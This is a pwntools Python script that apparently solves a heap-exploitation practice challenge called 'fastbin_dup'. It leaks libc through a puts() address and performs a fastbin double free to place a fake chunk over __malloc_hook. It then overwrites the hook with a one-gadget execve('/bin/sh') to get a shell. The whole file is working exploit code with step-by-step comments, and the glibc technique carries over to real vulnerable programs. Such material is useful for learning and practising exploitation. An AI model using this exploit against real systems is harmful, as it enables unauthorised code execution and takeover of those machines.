#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """
set context-sections code
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1


io.readuntil(b"puts() @ ")
puts_leak = int(io.recvline(), 16)


io.sendafter(b"username: ", b"pwnpope")
io.recvuntil(b"> ")


log.info(f"puts leak @ {puts_leak:#x}")
libc.address = puts_leak - libc.sym.puts
log.info(f"libc base @ {libc.address:#x}")


def malloc(size, data):
    io.sendafter(b"> ", b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


def free(index):
    io.sendafter(b"> ", b"2")
    io.sendafter(b"index: ", str(index).encode())
    io.recvuntil(b"> ")

# Request two 0x70-sized chunks.
# The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field.
# The "dup" chunk will be duplicated, the "safety" chunk is used to bypass the fastbins double-free mitigation.
malloc(0x68, b"A"*0x28)
malloc(0x68, b"B"*0x28)

# double free
free(0)  # dup chunk
free(1)  # safety chunk
free(0)  # dup chunk  | double free

# The next request for a 0x70-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it to the fake chunk overlapping the malloc hook,
# specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the least-significant byte of the size field.
malloc(0x68, p64(libc.sym.__malloc_hook - 35))  # 35 = distance between the hook and the fake chunk

# Make two more requests for 0x70-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to service these requests.
malloc(0x68, b"junk")
malloc(0x68, b"junk")

"""
0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
"""
# The next request for a 0x70-sized chunk is serviced by the fake chunk overlapping the malloc hook.
# Use it to overwrite the malloc hook with the address of a one-gadget.
malloc(0x68, b"A"*19 + p64(libc.address + 0xe1fa1))  # libc base + one gadget

# The next call to malloc() will instead call the one-gadget and drop a shell.
# The argument to malloc() is irrelevant, as long as it passes the program's size check.
malloc(1, "")

io.interactive()
